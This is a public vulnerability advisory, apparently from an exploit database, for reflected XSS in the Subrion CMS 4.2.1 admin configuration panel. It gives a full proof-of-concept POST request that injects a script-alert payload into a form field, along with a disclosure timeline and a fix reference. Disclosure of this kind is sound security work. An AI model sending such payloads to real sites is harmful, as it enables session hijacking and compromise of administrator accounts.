
# Multilple Cross Site Scripting (XSS) vulnerability exists in Intelliants Subrion CMS v4.2.1 in the Configuration panel. 
# Description
Subrion CMS is easy to install and simple to manage. Use it as a stand-alone application or in conjunction with other applications to create entry level sites, mid-sized or large sites.

Multiple Reflected Cross-site Scripting vulnerabilities were discovered in the Subrion CMS v.4.2.1 configuration panel, allowing a remote attacker to inject arbitrary JavaScript. 

**Date**: 27-02-2022 \
**Software Link:** https://subrion.org \
**Exploit Author**: HaMM0nz \
**CVE**: CVE-2020-18325 \
**Category:** Web Application \
**Affected URL**
- /panel/configuration/pictures/
- /panel/configuration/mail/
- /panel/configuration/miscellaneous/
- /panel/menus/add/
# Proof of Concept 
POST /panel/configuration/pictures/ HTTP/1.1 \
Host: 172.16.63.129 \
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:56.0) Gecko/20100101 Firefox/56.0 \
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 \
Accept-Language: en-US,en;q=0.5 \
Accept-Encoding: gzip, deflate \
Referer: http://172.16.63.129/panel/configuration/pictures/ \
Content-Type: multipart/form-data; boundary=---------------------------17647740521660843247800008623 \
Content-Length: 5605 \
Connection: close \
Cookie: INTELLI_7da515443a=2hen33trbsgsadue2rgcti4sr1; loader=loaded \
Upgrade-Insecure-Requests: 1 

-----------------------------17647740521660843247800008623 \
Content-Disposition: form-data; name="__st" 

t9eQz0wrvfrlVO1rNDO9ZbPOB3mDmkNw8k17yS6f \
-----------------------------17647740521660843247800008623 \
Content-Disposition: form-data; name="c[image_quality]" 

1 \
-----------------------------17647740521660843247800008623\
Content-Disposition: form-data; name="v[image_quality]" 

75 \
-----------------------------17647740521660843247800008623 \
Content-Disposition: form-data; name="c[allow_animated_gifs]" \
1 \
-----------------------------17647740521660843247800008623 \
Content-Disposition: form-data; name="v[allow_animated_gifs]" \
0 \
-----------------------------17647740521660843247800008623 \
Content-Disposition: form-data; name="v[allow_animated_gifs]" \
test"><script>alert(1)</script>1qazx 

# Timeline
**Discovery and report** : 24 June 2019 \
**CVE ID was assigned** : 11 Aug 2021 \
**Public** : 27 February 2022
# Solution
Consider complying to the OWASP's XSS prevention guidelines. (https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
